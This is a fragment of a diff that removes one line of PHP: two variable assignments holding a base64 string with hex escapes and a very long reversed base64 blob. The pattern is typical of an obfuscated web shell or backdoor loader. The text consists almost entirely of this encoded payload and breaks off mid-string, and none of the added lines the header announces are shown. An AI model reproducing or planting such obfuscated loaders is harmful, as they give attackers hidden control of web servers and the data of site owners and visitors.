@@ -1,1 +1,1801 @@
-<?php $Apaaja = "Sy1LzNFQUzYwtrS2V0svsYYw9dKrSvOS83MLilKLizXSqzLz0nISS1KRWEmJx\x61lmJvEpq\x63n5K\x61k\x61xSVFR\x61llGiqZfoklGYl5\x41UWZe\x63U5qZW\x61YG\x41N\x41\x41\x3d\x3d";$iNathanPrinsley = "=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